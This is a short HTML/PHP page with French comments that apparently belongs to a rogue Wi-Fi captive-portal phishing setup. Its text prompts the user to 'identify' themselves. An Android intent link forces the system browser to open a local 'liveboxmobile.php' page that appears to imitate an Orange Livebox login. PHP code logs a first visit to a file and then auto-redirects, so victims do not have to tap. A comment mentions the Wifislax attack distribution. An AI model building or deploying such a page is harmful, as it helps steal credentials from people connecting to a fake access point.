<html>
<head>
</head>
<body>
<a 
  href="intent:http://175.0.0.1/liveboxmobile.php#Intent;end" 
  target="_system">
  Cliquez pour ouvrir votre navigateur internet et vous identifier.
<?php
$filename = '/var/www/vu.txt'; // changer ça pour debian et wifislax
if(file_exists($filename)){
 echo sprintf('',$filename);
 header( "refresh:1; url=liveboxmobile.php" );  // redirection auto lorsque que chrome s'ouvre pour éviter à l'user d'avoir a appuyer
}else{
  $contents = 'Page vue'; // Céation du fichier vu.txt lors du premier passage          
  file_put_contents($filename, $contents);
}
?>
</body>
</html>